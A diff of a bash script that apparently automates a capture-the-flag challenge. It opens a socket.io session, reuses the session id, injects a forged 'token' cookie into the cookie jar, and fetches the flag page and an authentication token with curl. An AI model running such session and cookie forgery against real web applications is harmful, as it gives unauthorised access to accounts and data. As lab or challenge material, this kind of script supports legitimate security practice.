@@ -14,7 +14,7 @@ mkdir /work/ 2>/dev/null
 # Initiate session
 echo "1 - INITIATING SESSION"
 curl -s -X GET "http://$target_ip" -c "/work/1-cookies.txt" -L > /dev/null
-curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "/work/1-cookies.txt" -v -L
+curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7d5_o" -c "/work/1-cookies.txt" -L > /dev/null
 IO=$(grep io "/work/1-cookies.txt" | awk '{print $7}')
 echo "--> Session initiated with cookie IO ${IO}"
 
@@ -27,4 +27,4 @@ echo -e "\n$target_ip\tTRUE\t/\tFALSE\t0\ttoken\t$TOKEN" >> /work/1-cookies.txt
 curl -s -X GET "http://$target_ip" -b "/work/1-cookies.txt" -v -L -o /work/1-flag.html
 
 # Gather authentication token
-curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7dLN0&sid=Uh_L9L_qAqTu8vSTAAAB" -b "/work/1-cookies.txt"
+curl -s -X GET "http://$target_ip/socket.io/?EIO=3&transport=polling&t=PE7dLN0&sid=$IO" -b "/work/1-cookies.txt"
